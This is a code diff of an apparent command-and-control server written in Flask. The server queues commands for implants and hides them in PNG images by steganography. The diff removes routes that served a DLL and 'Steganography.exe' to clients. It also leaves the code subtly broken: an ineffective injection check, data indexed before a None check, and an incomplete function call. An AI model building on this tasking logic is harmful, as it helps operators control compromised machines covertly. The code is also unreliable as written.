@@ -62,29 +62,16 @@ def create_token():
         print(f"error logging in: {error}")
         return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}
 
-
 @app.route("/test", methods=["GET"])
 def handle_test():
     stuff = tools.executeInsertQuery("SELECT * from command_queue")
     return jsonify(stuff)
 
-
 @app.route("/")
 def home():
     return "<div>Hi</div>", 200
 
-
-@app.route("/lib")
-def handle_lib():
-    return send_from_directory(directory="./", filename="libpng16.dll")
-
-
-@app.route("/steg")
-def handle_steg():
-    return send_from_directory(directory="./", filename="Steganography.exe")
 # api endpoint to queue a command
-
-
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
 def handle_execute():
@@ -120,23 +107,22 @@ def handle_execute():
 def get_qcommands():
     data = request.json
     id = data['id']
-    # if [";", "\'", "\""] in id:
-    #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
-
+    if [";", "\'", "\""] in id:
+        return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
     try:
-        query = sql.SQL("select * from {table} where {column} = %s").format(
+        query = sql.SQL("select task_id, target_implant_id, command from {table} where {column} = %s").format(
             table=sql.Identifier('task_queue'),
             column=sql.Identifier('target_implant_id'))
         db_resp = tools.executeSelectQueryVars(query, [id])
         print(f"this is the db response: {db_resp}")
+
+        data = {"task_id":db_resp[0], "target_implant_id":db_resp[1], "command":db_resp[2]}
+
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
         query = "UPDATE task_queue SET status=%s WHERE id=%s"
         tools.executeGenericVar(query, ['executing', id])
-
-        img = SteganographyFixed.iio.imread("doge.png")
-        SteganographyFixed.iio.imwrite("doge_encoded.png", SteganographyFixed.encode(
-            img, json.dumps(db_resp, default=str)))
+        SteganographyFixed.createEncodedImage("doge.png", )
         response = send_file('doge_encoded.png', mimetype='image/png')
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
